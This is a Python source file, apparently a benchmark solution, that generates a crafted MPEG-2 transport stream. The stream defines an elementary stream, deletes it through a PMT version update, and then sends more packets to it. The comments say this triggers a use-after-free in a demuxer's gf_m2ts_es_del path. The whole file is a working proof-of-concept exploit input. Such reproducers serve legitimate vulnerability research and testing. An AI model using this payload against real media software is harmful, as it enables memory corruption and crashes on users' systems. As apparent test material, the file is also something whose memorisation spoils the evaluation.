import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # MPEG-2 CRC32 implementation
        def crc32(data):
            crc = 0xFFFFFFFF
            for b in data:
                crc ^= (b << 24)
                for _ in range(8):
                    if crc & 0x80000000:
                        crc = (crc << 1) ^ 0x04C11DB7
                    else:
                        crc <<= 1
                    crc &= 0xFFFFFFFF
            return crc

        def make_ts_packet(pid, cc, payload, pusi=0):
            # TS Header
            # Sync byte (0x47)
            h1 = 0x47
            # TEI(0), PUSI, Prio(0), PID(13)
            h2 = (pusi << 6) | ((pid >> 8) & 0x1F)
            h3 = pid & 0xFF
            # SC(00), AFC(01 - Payload Only), CC(4)
            h4 = 0x10 | (cc & 0x0F)
            
            header = struct.pack('BBBB', h1, h2, h3, h4)
            
            # Pad payload to 184 bytes with 0xFF
            if len(payload) < 184:
                payload = payload + b'\xff' * (184 - len(payload))
            elif len(payload) > 184:
                payload = payload[:184]
                
            return header + payload

        # Packet 1: PAT
        # PID: 0, CC: 0
        # Program 1 maps to PMT PID 0x100
        pat_content = bytearray()
        pat_content.append(0x00) # Table ID (PAT)
        # Section Length: 5(Header) + 4(Loop) + 4(CRC) = 13 (0x0D)
        # SSI=1, Reserved=11 -> 0xB
        pat_content += struct.pack('>H', 0xB00D)
        pat_content += struct.pack('>H', 0x0001) # Transport Stream ID
        pat_content += bytearray([0xC1, 0x00, 0x00]) # Res=11, Ver=0, CN=1, Sec=0, Last=0
        
        # Loop: Program 1 -> PID 0x100
        pat_content += struct.pack('>H', 0x0001) # Program Number 1
        pat_content += struct.pack('>H', 0xE100) # Res=111, PID=0x100
        
        # CRC32
        pat_content += struct.pack('>I', crc32(pat_content))
        
        # Add Pointer Field (0x00) because PUSI=1
        pkt1 = make_ts_packet(0, 0, b'\x00' + pat_content, pusi=1)


        # Packet 2: PMT Version 0
        # PID: 0x100, CC: 0
        # Defines ES on PID 0x200
        pmt0_content = bytearray()
        pmt0_content.append(0x02) # Table ID (PMT)
        # Section Length: 9(Header) + 5(Stream Loop) + 4(CRC) = 18 (0x12)
        pmt0_content += struct.pack('>H', 0xB012)
        pmt0_content += struct.pack('>H', 0x0001) # Program Number 1
        pmt0_content += bytearray([0xC1, 0x00, 0x00]) # Res=11, Ver=0, CN=1, Sec=0, Last=0
        pmt0_content += struct.pack('>H', 0xE200) # Res=111, PCR PID=0x200
        pmt0_content += struct.pack('>H', 0xF000) # Res=1111, Prog Info Len=0
        
        # Stream Loop: Type AAC (0x0F) -> PID 0x200
        pmt0_content.append(0x0F) # Stream Type
        pmt0_content += struct.pack('>H', 0xE200) # Res=111, Elem PID=0x200
        pmt0_content += struct.pack('>H', 0xF000) # Res=1111, ES Info Len=0
        
        # CRC32
        pmt0_content += struct.pack('>I', crc32(pmt0_content))
        
        pkt2 = make_ts_packet(0x100, 0, b'\x00' + pmt0_content, pusi=1)


        # Packet 3: Data Payload for PID 0x200
        # Initializes the stream context in the demuxer
        pkt3 = make_ts_packet(0x200, 0, b'\xAA' * 184)


        # Packet 4: PMT Version 1 (Update)
        # PID: 0x100, CC: 1
        # Removes ES 0x200 (Empty Loop) to trigger gf_m2ts_es_del
        pmt1_content = bytearray()
        pmt1_content.append(0x02) # Table ID (PMT)
        # Section Length: 9(Header) + 0(Stream Loop) + 4(CRC) = 13 (0x0D)
        pmt1_content += struct.pack('>H', 0xB00D)
        pmt1_content += struct.pack('>H', 0x0001) # Program Number 1
        # Version incremented: Ver=1 (00001) -> 0xC3 (11 00001 1)
        pmt1_content += bytearray([0xC3, 0x00, 0x00]) 
        # Change PCR PID to 0x1FFF (Padding) to remove reference to 0x200
        pmt1_content += struct.pack('>H', 0xFFFF) 
        pmt1_content += struct.pack('>H', 0xF000) # Prog Info Len=0
        # Empty Stream Loop
        
        # CRC32
        pmt1_content += struct.pack('>I', crc32(pmt1_content))
        
        pkt4 = make_ts_packet(0x100, 1, b'\x00' + pmt1_content, pusi=1)


        # Packet 5: Data Payload for PID 0x200
        # Sent after the ES has been deleted by PMT update. Triggers UAF.
        pkt5 = make_ts_packet(0x200, 1, b'\xBB' * 184)


        # Packet 6: More Data for PID 0x200 (Redundancy/Padding)
        pkt6 = make_ts_packet(0x200, 2, b'\xCC' * 184)

        return pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6
